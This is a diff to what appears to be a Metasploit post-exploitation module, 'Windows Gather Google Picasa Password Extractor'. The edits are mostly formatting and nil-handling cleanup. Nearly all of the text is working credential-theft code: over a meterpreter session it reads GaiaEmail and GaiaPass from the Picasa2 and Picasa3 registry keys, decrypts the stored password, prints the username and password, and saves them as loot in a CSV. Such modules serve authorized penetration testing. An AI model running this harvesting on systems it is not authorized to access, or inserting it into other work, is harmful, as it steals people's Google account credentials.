@@ -19,18 +19,18 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'		  => 'Windows Gather Google Picasa Password Extractor',
+				'Name'          => 'Windows Gather Google Picasa Password Extractor',
 				'Description'   => %q{
 					This module extracts and decrypts the login passwords
 					stored by Google Picasa.
 				},
-				'License'	   => MSF_LICENSE,
-				'Author' =>
+				'License'       => MSF_LICENSE,
+				'Author'        =>
 				[
 					'SecurityXploded Team',  #www.SecurityXploded.com
 					'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
 				],
-				'Platform'	  => [ 'win' ],
+				'Platform'      => [ 'win' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
 	end
@@ -70,14 +70,12 @@ class Metasploit3 < Msf::Post
 	end
 
 	def get_registry
-	
+
 		begin
 			print_status("Looking in registry for stored login passwords by Picasa ...")
 
-			username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\",
-			'GaiaEmail')
-			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\",
-			'GaiaPass')
+			username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaEmail') || ''
+			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaPass')  || ''
 
 			credentials = Rex::Ui::Text::Table.new(
 					'Header'    => "Picasa Credentials",
@@ -87,59 +85,56 @@ class Metasploit3 < Msf::Post
 						"User",
 						"Password"
 					])
-			
-			
+
 			foundcreds = 0
-			if username != nil and password != nil				
+			if !username.empty? and !password.empty?
 				passbin = [password].pack("H*")
 				pass = decrypt_password(passbin)
 
-				if pass != nil
+				if pass and !pass.empty?
 					print_status("Found Picasa 2 credentials.")
-					print_good("Username: #{username}\t Password: #{pass}")				
-					
+					print_good("Username: #{username}\t Password: #{pass}")
+
 					foundcreds = 1
 					credentials << [username,pass]
-
 				end
 			end
 
 			#For early versions of Picasa3
-			username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\",
-			'GaiaEmail')
-			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\",
-			'GaiaPass')
+			username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\", 'GaiaEmail') || ''
+			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\", 'GaiaPass')  || ''
 
 
-			if username != nil and password != nil
+			if !username.empty? and !password.empty?
 				passbin = [password].pack("H*")
 				pass = decrypt_password(passbin)
 
-				if pass != nil
+				if pass and !pass.empty?
 					print_status("Found Picasa 3 credentials.")
-					print_good("Username: #{username}\t Password: #{pass}")					
+					print_good("Username: #{username}\t Password: #{pass}")
 
 					foundcreds = 1
 					credentials << [username,pass]
 				end
 			end
-		
+
 		if foundcreds == 1
 			path = store_loot(
-			"picasa.creds",
-			"text/csv",
-			session,
-			credentials.to_csv,
-			"decrypted_picasa_data.csv",
-			"Decrypted Picasa Passwords")
+				"picasa.creds",
+				"text/csv",
+				session,
+				credentials.to_csv,
+				"decrypted_picasa_data.csv",
+				"Decrypted Picasa Passwords"
+			)
 
 			print_status("Decrypted passwords saved in: #{path}")
-		else 
+		else
 			print_status("No Picasa credentials found.")
 		end
 
 		rescue ::Exception => e
-				print_error("An error has occurred: #{e.to_s}")
+			print_error("An error has occurred: #{e.to_s}")
 		end
 	end
 
